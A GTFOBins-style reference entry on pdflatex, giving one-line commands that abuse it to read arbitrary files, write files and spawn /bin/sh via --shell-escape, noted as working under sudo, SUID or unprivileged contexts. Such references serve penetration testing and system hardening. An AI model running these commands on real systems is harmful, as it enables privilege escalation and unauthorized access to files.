---
type: gtfobin
name: pdflatex
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# pdflatex

## file-read

```bash
pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
pdftotext texput.pdf -
```
_The read file will be part of the PDF output._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
```
_The file can only be written in the current directory, and the `.tex` extension is mandatory._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
```
**Contexts:** sudo, suid, unprivileged
